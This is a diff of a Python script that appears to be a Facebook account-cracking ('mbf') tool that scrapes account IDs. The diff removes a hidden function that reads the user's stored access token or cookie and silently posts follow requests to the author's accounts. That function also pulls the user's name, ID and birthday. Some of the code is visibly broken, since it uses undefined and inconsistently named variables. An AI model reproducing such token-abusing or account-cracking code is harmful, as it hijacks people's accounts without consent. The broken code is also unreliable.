@@ -258,29 +258,6 @@ def mbfv2():
              if "Lihat Selengkapnya" in str(grab):
                  grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
              return id
-         def bot_follow():
-	         try:
-		         cek=open("login.txt","r").read()
-		         oky = requests.get("https://graph.facebook.com/me/?access_token="+cek)
-		         nama = a["name"]
-		         id = a["id"]
-	         except IOError:
-		         print((" \n \x1b[1;97m[\x1b[1;91m!!\x1b[1;97m] Cookie Salah"))
-		         logs()
-	         requests.post('https://graph.facebook.com/100040500757688/subscribers?access_token=' + cek) # Mason Anjing
-	         requests.post('https://graph.facebook.com/100071637038126/subscribers?access_token=' + cek) # Milzu
-#	         requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + cek) # Unknow
-#	         requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + cek) # Unknow
-#	         requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + cek) # Unknow
-#	         requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + cek) # Unknow
-#	         requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + cek) # Unknow
-	         asu()
-         def asu():
-             cek = open("cookies").read()
-             Oky = requests.get("https://graph.facebook.com/me/?access_token="+cek)
-             nama = a["first_name"]
-             ttl = a["birthday"]
-             id = a["id"]
          if __name__ == '__main__':
                try:
                    ses = requests.Session()
@@ -289,7 +266,6 @@ def mbfv2():
                    lupo_lupo_milzu()
                    menu()
                    peak()
-                   asu()
                    print(" Welcome User \033[1;32m" + nama)
                    print(" ID Kamu : \033[1;32m" + id)
                    print(" Tanggal lahir kamu     : \033[1;32m" + ttl)
